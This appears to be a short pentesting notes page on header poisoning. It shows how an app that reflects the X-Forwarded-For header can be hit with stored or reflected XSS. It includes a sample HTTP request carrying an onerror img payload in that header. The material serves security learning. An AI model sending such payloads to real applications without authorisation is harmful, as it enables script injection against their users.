---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Header Poisoning

Sometimes headers could be injected with XSS when its content is used directly in some functionalities of the app.

Here we find an example of this scenario:

* An application has a _See Your IP_ functionality which retrieves the information of the user's IP via the `X-Forwarded-For` header.

{% code title="Example Request" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```http
GET http://$url HTTP/1.1
host: host
X-Forwarded-For: $IP
...
```
{% endcode %}

***

* We can inject JavaScript code, so when this function is triggered, the payload will be executed

{% code title="Example Request" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```http
GET http://$url HTTP/1.1
host: host
X-Forwarded-For: <img src=x onerror='alert("HACKED")'/>
...
```
{% endcode %}
